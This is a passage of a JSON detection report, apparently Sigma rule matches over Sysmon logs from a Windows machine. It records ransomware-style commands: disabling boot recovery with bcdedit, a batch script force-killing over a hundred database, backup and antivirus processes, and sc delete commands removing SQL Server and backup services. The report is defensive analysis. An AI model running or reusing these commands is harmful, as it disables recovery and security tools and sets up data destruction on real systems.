                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-82A1-64A1-0907-000000004400}; ProcessId=5524; Product=Microsoft\\xae Windows\\xae Operating System; Description=Boot Configuration Data Editor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-82A0-64A1-BF06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=C46E3768DB01E7DC3B92EF42CC1B9C73,SHA256=3AD26DB8DC988EAD9E73FECF4D8D888A66F7965AC09F8AF4E3CFCD09028A5B59,IMPHASH=5590A306D0FA939852B69E8411CA102B; OriginalFileName=bcdedit.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.950 (WinBuild.160101.0800); ParentProcessId=3348; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=bcdedit  /set {current} recoveryenabled no; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\bcdedit.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c bcdedit /set {current} recoveryenabled no; UtcTime=1688306337; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "2da0b3cba5dc2b56e1426049598590c54a224e6d15740b9b07c108e089c84520",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Boot Configuration Tampering Via Bcdedit.EXE",
                                                                       "rule_description":  "Detects the use of the bcdedit command to tamper with the boot configuration data. This technique is often times used by malware or attackers as a destructive way before launching ransomware.",
                                                                       "rule_author":  "E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-82A1-64A1-FA06-000000004400}; ProcessId=7956; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-8299-64A1-1606-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8052; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cmd  /c \"color e \u0026 @taskkill /IM ThunderPlatform.exe /F \u0026 @taskkill /IM iexplore.exe /F \u0026 @taskkill /IM vm-agent.exe /F \u0026 @taskkill /IM vm-agent-daemon.exe /F \u0026 @taskkill /IM eSightService.exe /F \u0026 @taskkill /IM cygrunsrv.exe /F \u0026 @taskkill /IM wrapper.exe /F \u0026 @taskkill /IM nginx.exe /F \u0026 @taskkill /IM node.exe /F \u0026 @taskkill /IM sshd.exe /F \u0026 @taskkill /IM vm-tray.exe /F \u0026 @taskkill /IM iempwatchdog.exe /F \u0026 @taskkill /IM sqlwriter.exe /F \u0026 @taskkill /IM php.exe /F \u0026 @taskkill /IM \"notepad++.exe\" /F \u0026 @taskkill /IM \"phpStudy.exe\" /F \u0026 @taskkill /IM OPCClient.exe /F \u0026 @taskkill /IM navicat.exe /F \u0026 @taskkill /IM SupportAssistAgent.exe /F \u0026 @taskkill /IM SunloginClient.exe /F \u0026 @taskkill /IM SOUNDMAN.exe /F \u0026 @taskkill /IM WeChat.exe /F \u0026 @taskkill /IM TXPlatform.exe /F \u0026 @taskkill /IM Tencentdll.exe /F \u0026 @taskkill /IM httpd.exe /F \u0026 @taskkill /IM jenkins.exe /F \u0026 @taskkill /IM QQ.exe /F \u0026 @taskkill /IM HaoZip.exe /F \u0026 @taskkill /IM HaoZipScan.exe /F \u0026 @taskkill /IM navicat.exe /F \u0026 @taskkill /IM TSVNCache.exe /F \u0026 @taskkill /IM RAVCpl64.exe /F \u0026 @taskkill /IM secbizsrv.exe /F \u0026 @taskkill /IM aliwssv.exe /F \u0026 @taskkill /IM Helper_Haozip.exe /F \u0026 @taskkill /IM acrotray.exe /F \u0026 @taskkill /IM \"FileZilla Server Interface.exe\" /F \u0026 @taskkill /IM YoudaoNote.exe /F \u0026 @taskkill /IM YNoteCefRender.exe /F \u0026 @taskkill /IM idea.exe /F \u0026 @taskkill /IM fsnotifier.exe /F \u0026 @taskkill /IM picpick.exe /F \u0026 @taskkill /IM lantern.exe /F \u0026 @taskkill /IM sysproxy-cmd.exe /F \u0026 @taskkill /IM service.exe /F \u0026 @taskkill /IM pcas.exe /F \u0026 @taskkill /IM PresentationFontCache.exe /F \u0026 @taskkill /IM RtWlan.exe /F \u0026 @taskkill /IM monitor.exe /F \u0026 @taskkill /IM Correspond.exe /F \u0026 @taskkill /IM ChatServer.exe /F \u0026 @taskkill /IM InetMgr.exe /F \u0026 @taskkill /IM LogonServer.exe /F \u0026 @taskkill /IM GameServer.exe /F \u0026 @taskkill /IM ServUAdmin.exe /F \u0026 @taskkill /IM ServUDaemon.exe /F \u0026 @taskkill /IM update0.exe /F \u0026 @taskkill /IM server.exe /F \u0026 @taskkill /IM w3wp.exe /F \u0026 @taskkill /IM notepad.exe /F \u0026 @taskkill /IM PalmInputService.exe /F \u0026 @taskkill /IM PalmInputGuard.exe /F \u0026 @taskkill /IM UpdateServer.exe /F \u0026 @taskkill /IM UpdateGate.exe /F \u0026 @taskkill /IM DBServer.exe /F \u0026 @taskkill /IM LoginGate.exe /F \u0026 @taskkill /IM SelGate.exe /F \u0026 @taskkill /IM RunGate.exe /F \u0026 @taskkill /IM M2Server.exe /F \u0026 @taskkill /IM LogDataServer.exe /F \u0026 @taskkill /IM LoginSrv.exe /F \u0026 @taskkill /IM sqlceip.exe /F \u0026 @taskkill /IM mqsvc.exe /F \u0026 @taskkill /IM RefundOrder.exe /F \u0026 @taskkill /IM ClamTray.exe /F \u0026 @taskkill /IM AdobeARM.exe /F \u0026 @taskkill /IM veeam.backup.shell.exe /F \u0026 @taskkill /IM VpxClient.exe /F \u0026 @taskkill /IM vmware-vmrc.exe /F \u0026 @taskkill /IM DSCPatchService.exe /F \u0026 @taskkill /IM scktsrvr.exe /F \u0026 @taskkill /IM ServerManager.exe /F \u0026 @taskkill /IM Dispatcher.exe /F \u0026 @taskkill /IM EFDispatcher.exe /F \u0026 @taskkill /IM sqlceip.exe /F \u0026 @taskkill /IM mqsvc.exe /F \u0026 @taskkill /IM RefundOrder.exe /F \u0026 @taskkill /IM ClamTray.exe /F \u0026 @taskkill /IM AdobeARM.exe /F \u0026 @taskkill /IM veeam.backup.shell.exe /F \u0026 @taskkill /IM VpxClient.exe /F \u0026 @taskkill /IM vmware-vmrc.exe /F \u0026 @taskkill /IM DSCPatchService.exe /F \u0026 @taskkill /IM scktsrvr.exe /F \u0026 @taskkill /IM ServerManager.exe /F \u0026 @taskkill /IM Dispatcher.exe /F \u0026 @taskkill /IM EFDispatcher.exe /F \u0026 @taskkill /IM ClamWin.exe /F \u0026 @taskkill /IM srvany.exe /F \u0026 @taskkill /IM JT_AG-8332.exe /F \u0026 @taskkill /IM XXTClient.exe /F \u0026 @taskkill /IM clean.exe /F \u0026 @taskkill /IM sqlservr.exe /F \u0026 @taskkill /IM \"Net.Service.exe\" /F \u0026 @taskkill /IM plsqldev.exe /F \u0026 @taskkill /IM splwow64.exe /F \u0026 @taskkill /IM Oobe.exe /F \u0026 @taskkill /IM QQYService.exe /F \u0026 @taskkill /IM sqlservr.exe /F \u0026 @taskkill /IM SGTool.exe /F \u0026 @taskkill /IM postgres.exe /F \u0026 @taskkill /IM AppVShNotify.exe /F \u0026 @taskkill /IM OfficeClickToRun.exe /F \u0026 @taskkill /IM EntDT.exe /F \u0026 @taskkill /IM EntPublish.exe /F\"; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\FF.bat\" \"; UtcTime=1688306337; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-82AB-64A1-2709-000000004400}; ProcessId=3500; Product=Microsoft\\xae Windows\\xae Operating System; Description=Terminates Processes; Company=Microsoft Corporation; ParentProcessGuid={C784477D-82A1-64A1-FA06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=530C6A6CBA137EAA7021CEF9B234E8D4,SHA256=26B9B184C2F7F60811C0C4CB25C12568D996AC1ECE0EF64AA1B9E8F39AEA74D7,IMPHASH=100938B32F577E925618EA395A8C469B; OriginalFileName=taskkill.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7956; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=taskkill  /IM Tencentdll.exe /F ; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\taskkill.exe; IntegrityLevel=High; ParentCommandLine=cmd  /c \"color e \u0026 @taskkill /IM ThunderPlatform.exe /F \u0026 @taskkill /IM iexplore.exe /F \u0026 @taskkill /IM vm-agent.exe /F \u0026 @taskkill /IM vm-agent-daemon.exe /F \u0026 @taskkill /IM eSightService.exe /F \u0026 @taskkill /IM cygrunsrv.exe /F \u0026 @taskkill /IM wrapper.exe /F \u0026 @taskkill /IM nginx.exe /F \u0026 @taskkill /IM node.exe /F \u0026 @taskkill /IM sshd.exe /F \u0026 @taskkill /IM vm-tray.exe /F \u0026 @taskkill /IM iempwatchdog.exe /F \u0026 @taskkill /IM sqlwriter.exe /F \u0026 @taskkill /IM php.exe /F \u0026 @taskkill /IM \"notepad++.exe\" /F \u0026 @taskkill /IM \"phpStudy.exe\" /F \u0026 @taskkill /IM OPCClient.exe /F \u0026 @taskkill /IM navicat.exe /F \u0026 @taskkill /IM SupportAssistAgent.exe /F \u0026 @taskkill /IM SunloginClient.exe /F \u0026 @taskkill /IM SOUNDMAN.exe /F \u0026 @taskkill /IM WeChat.exe /F \u0026 @taskkill /IM TXPlatform.exe /F \u0026 @taskkill /IM Tencentdll.exe /F \u0026 @taskkill /IM httpd.exe /F \u0026 @taskkill /IM jenkins.exe /F \u0026 @taskkill /IM QQ.exe /F \u0026 @taskkill /IM HaoZip.exe /F \u0026 @taskkill /IM HaoZipScan.exe /F \u0026 @taskkill /IM navicat.exe /F \u0026 @taskkill /IM TSVNCache.exe /F \u0026 @taskkill /IM RAVCpl64.exe /F \u0026 @taskkill /IM secbizsrv.exe /F \u0026 @taskkill /IM aliwssv.exe /F \u0026 @taskkill /IM Helper_Haozip.exe /F \u0026 @taskkill /IM acrotray.exe /F \u0026 @taskkill /IM \"FileZilla Server Interface.exe\" /F \u0026 @taskkill /IM YoudaoNote.exe /F \u0026 @taskkill /IM YNoteCefRender.exe /F \u0026 @taskkill /IM idea.exe /F \u0026 @taskkill /IM fsnotifier.exe /F \u0026 @taskkill /IM picpick.exe /F \u0026 @taskkill /IM lantern.exe /F \u0026 @taskkill /IM sysproxy-cmd.exe /F \u0026 @taskkill /IM service.exe /F \u0026 @taskkill /IM pcas.exe /F \u0026 @taskkill /IM PresentationFontCache.exe /F \u0026 @taskkill /IM RtWlan.exe /F \u0026 @taskkill /IM monitor.exe /F \u0026 @taskkill /IM Correspond.exe /F \u0026 @taskkill /IM ChatServer.exe /F \u0026 @taskkill /IM InetMgr.exe /F \u0026 @taskkill /IM LogonServer.exe /F \u0026 @taskkill /IM GameServer.exe /F \u0026 @taskkill /IM ServUAdmin.exe /F \u0026 @taskkill /IM ServUDaemon.exe /F \u0026 @taskkill /IM update0.exe /F \u0026 @taskkill /IM server.exe /F \u0026 @taskkill /IM w3wp.exe /F \u0026 @taskkill /IM notepad.exe /F \u0026 @taskkill /IM PalmInputService.exe /F \u0026 @taskkill /IM PalmInputGuard.exe /F \u0026 @taskkill /IM UpdateServer.exe /F \u0026 @taskkill /IM UpdateGate.exe /F \u0026 @taskkill /IM DBServer.exe /F \u0026 @taskkill /IM LoginGate.exe /F \u0026 @taskkill /IM SelGate.exe /F \u0026 @taskkill /IM RunGate.exe /F \u0026 @taskkill /IM M2Server.exe /F \u0026 @taskkill /IM LogDataServer.exe /F \u0026 @taskkill /IM LoginSrv.exe /F \u0026 @taskkill /IM sqlceip.exe /F \u0026 @taskkill /IM mqsvc.exe /F \u0026 @taskkill /IM RefundOrder.exe /F \u0026 @taskkill /IM ClamTray.exe /F \u0026 @taskkill /IM AdobeARM.exe /F \u0026 @taskkill /IM veeam.backup.shell.exe /F \u0026 @taskkill /IM VpxClient.exe /F \u0026 @taskkill /IM vmware-vmrc.exe /F \u0026 @taskkill /IM DSCPatchService.exe /F \u0026 @taskkill /IM scktsrvr.exe /F \u0026 @taskkill /IM ServerManager.exe /F \u0026 @taskkill /IM Dispatcher.exe /F \u0026 @taskkill /IM EFDispatcher.exe /F \u0026 @taskkill /IM sqlceip.exe /F \u0026 @taskkill /IM mqsvc.exe /F \u0026 @taskkill /IM RefundOrder.exe /F \u0026 @taskkill /IM ClamTray.exe /F \u0026 @taskkill /IM AdobeARM.exe /F \u0026 @taskkill /IM veeam.backup.shell.exe /F \u0026 @taskkill /IM VpxClient.exe /F \u0026 @taskkill /IM vmware-vmrc.exe /F \u0026 @taskkill /IM DSCPatchService.exe /F \u0026 @taskkill /IM scktsrvr.exe /F \u0026 @taskkill /IM ServerManager.exe /F \u0026 @taskkill /IM Dispatcher.exe /F \u0026 @taskkill /IM EFDispatcher.exe /F \u0026 @taskkill /IM ClamWin.exe /F \u0026 @taskkill /IM srvany.exe /F \u0026 @taskkill /IM JT_AG-8332.exe /F \u0026 @taskkill /IM XXTClient.exe /F \u0026 @taskkill /IM clean.exe /F \u0026 @taskkill /IM sqlservr.exe /F \u0026 @taskkill /IM \"Net.Service.exe\" /F \u0026 @taskkill /IM plsqldev.exe /F \u0026 @taskkill /IM splwow64.exe /F \u0026 @taskkill /IM Oobe.exe /F \u0026 @taskkill /IM QQYService.exe /F \u0026 @taskkill /IM sqlservr.exe /F \u0026 @taskkill /IM SGTool.exe /F \u0026 @taskkill /IM postgres.exe /F \u0026 @taskkill /IM AppVShNotify.exe /F \u0026 @taskkill /IM OfficeClickToRun.exe /F \u0026 @taskkill /IM EntDT.exe /F \u0026 @taskkill /IM EntPublish.exe /F\"; UtcTime=1688306347; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "7d53de0fb9c4ee79b8ab06605cd3a8faaa400a586d577c9a7d692f059a3ac78c",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential WinAPI Calls Via CommandLine",
                                                                       "rule_description":  "Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-829A-64A1-2406-000000004400}; ProcessId=1056; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-829A-64A1-1B06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7172; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"SQL Server Reporting Services\" ; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\sc.exe; IntegrityLevel=High; ParentCommandLine=cmd  /c \"color b \u0026 @taskkill /IM ReportingServicesService.exe /F \u0026 @sc delete \"SQL Server Reporting Services\" \u0026 @sc delete MSSQLFDLauncher \u0026 @taskkill /IM U8CEServer.exe /F \u0026 @taskkill /IM ServerNT.exe /F \u0026 @net stop UFNet \u0026 @taskkill /IM MessageNotification.exe /F \u0026 @taskkill /IM cbVSCService11.exe /F \u0026 @taskkill /IM cbService.exe /F \u0026 @sc delete cbVSCService11 \u0026 @sc delete CobianBackup11\"; UtcTime=1688306330; RuleName=-}"
                                                                                             },
